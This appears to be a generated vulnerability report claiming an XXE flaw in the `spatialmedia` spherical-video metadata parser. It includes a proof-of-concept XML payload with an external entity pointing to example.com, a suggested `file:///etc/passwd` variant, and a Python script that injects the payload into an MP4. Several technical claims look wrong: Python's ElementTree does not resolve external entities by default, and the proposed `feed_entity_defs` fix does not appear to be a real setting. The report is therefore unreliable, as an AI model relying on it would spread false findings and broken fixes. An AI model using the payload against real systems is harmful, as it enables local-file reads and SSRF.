- Vulnerability Name: XML External Entity (XXE) Injection
- Description: The `spatialmedia` tool is vulnerable to XML External Entity (XXE) injection. When processing media files with embedded spherical video metadata, the tool parses the XML metadata using `xml.etree.ElementTree.XML`. If a crafted media file contains a malicious XML payload with external entity definitions, the parser may attempt to resolve these external entities. This can lead to various attacks, including reading local files, denial of service, or in some cases, server-side request forgery (SSRF). An attacker can craft a malicious MP4 or MOV file containing a specially crafted XML payload in the spherical video metadata section. When a user uses the `spatialmedia` tool (either via command line or GUI) to examine or inject metadata into this malicious file, the XML parser processes the malicious payload, triggering the XXE vulnerability.
- Impact:
    - Information Disclosure: An attacker can potentially read local files on the system where the `spatialmedia` tool is executed. For example, an attacker might be able to read sensitive files such as configuration files or user data, depending on the permissions of the user running the tool.
    - Server-Side Request Forgery (SSRF): In some scenarios, if the system has network connectivity, an attacker might be able to use the vulnerable XML parser to make requests to internal or external systems, potentially leading to further attacks.
- Vulnerability Rank: High
- Currently Implemented Mitigations: None. The code uses `xml.etree.ElementTree.XML` for parsing XML metadata without any explicit mitigations against XXE vulnerabilities, such as disabling external entity loading.
- Missing Mitigations:
    - Disable external entity processing in the XML parser. When parsing XML metadata, the `xml.etree.ElementTree.XMLParser` should be configured to disallow external entity loading. This can be achieved by setting `parser.parser.feed_entity_defs = False` if using a custom parser or by using secure parsing practices for `xml.etree.ElementTree`.
    - Input sanitization and validation: While mitigating XXE directly is crucial, validating and sanitizing XML input can provide an additional layer of defense. However, for XXE, disabling external entities is the most effective mitigation.
- Preconditions:
    - The attacker needs to create a malicious media file (MP4 or MOV) with a crafted XML payload in the spherical video metadata.
    - The victim must use the `spatialmedia` tool (command-line or GUI) to process this malicious media file, for example, by examining its metadata or attempting to inject new metadata.
- Source Code Analysis:
    1. The vulnerability occurs in the `spatialmedia/metadata_utils.py` file, specifically in the `parse_spherical_xml` function.
    2. This function takes XML content as input and parses it using `xml.etree.ElementTree.XML(contents)`.
    ```python
    def parse_spherical_xml(contents, console):
        """Returns spherical metadata for a set of xml data.
        ...
        """
        try:
            parsed_xml = xml.etree.ElementTree.XML(contents) # Vulnerable line
        except xml.etree.ElementTree.ParseError:
            ...
    ```
    3. `xml.etree.ElementTree.XML` by default in Python versions before 3.7 might be vulnerable to XXE if external entities are present in the XML and not explicitly disabled. The project documentation mentions Python 2.7 compatibility, which is likely vulnerable by default.
    4. The parsed XML is then processed to extract metadata tags. If the XML contains an external entity definition, and the parser attempts to resolve it, the XXE vulnerability is triggered.
    5. There is no explicit configuration of `XMLParser` to disable external entity loading before parsing the XML content.

- Security Test Case:
    1. Prepare a malicious XML payload (e.g., `xxe_payload.xml`) that attempts to access an external URL or a local file. For example, to test for external interaction:
    ```xml
    <!DOCTYPE foo [
      <!ELEMENT foo ANY >
      <!ENTITY xxe SYSTEM "http://example.com/test_xxe" >
    ]>
    <rdf:SphericalVideo xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:GSpherical="http://ns.google.com/videos/1.0/spherical/">
      <GSpherical:Spherical>&xxe;</GSpherical:Spherical>
      <GSpherical:Stitched>true</GSpherical:Stitched>
      <GSpherical:StitchingSoftware>XXE Test</GSpherical:StitchingSoftware>
      <GSpherical:ProjectionType>equirectangular</GSpherical:ProjectionType>
    </rdf:SphericalVideo>
    ```
    2. Create a dummy MP4 file (e.g., `dummy.mp4`). This can be an empty MP4 container or a simple valid MP4 file.
    3. Use a Python script (e.g., `inject_xxe.py`) to inject the malicious XML payload as spherical metadata into the dummy MP4 file.
    ```python
    import os
    from spatialmedia import metadata_utils

    # Read the malicious XML payload from file
    with open('xxe_payload.xml', 'r') as f:
        xml_content = f.read()

    # Generate metadata object
    metadata = metadata_utils.Metadata()
    metadata.video = xml_content.encode('utf-8') # Directly use the crafted XML

    # Input and output file paths
    input_file = 'dummy.mp4'
    output_file = 'xxe_injected.mp4'

    # Inject metadata
    console_output = []
    metadata_utils.inject_metadata(input_file, output_file, metadata, console_output.append)
    print("Metadata injected to {}".format(output_file))
    ```
    4. Run `inject_xxe.py` to create the malicious MP4 file `xxe_injected.mp4`. You might need to create a minimal valid `dummy.mp4` first. If you already have a valid mp4, you can use that as input.
    5. Use the `spatialmedia` command-line tool to examine the metadata of the `xxe_injected.mp4` file:
    ```bash
    python spatialmedia xxe_injected.mp4
    ```
    6. Monitor network traffic using tools like `tcpdump` or `Wireshark` to see if a request is made to `example.com` when `spatialmedia` parses the file. Alternatively, if you used a local file path in the XXE payload (e.g., `file:///etc/passwd`), check the output of the `spatialmedia` tool for any unusual output or errors that might indicate file access. If the tool attempts to access `example.com` or shows errors related to external entity resolution, it confirms the XXE vulnerability. For local file access, the tool's output might not directly reveal the file content, but parsing errors or delays could indicate an attempt to process the local file entity. To reliably detect local file reading, you might need to monitor file access attempts using system-level auditing tools, if direct output is not revealing. For the purpose of this test case, observing network traffic to `example.com` is a simpler and more direct way to confirm the vulnerability.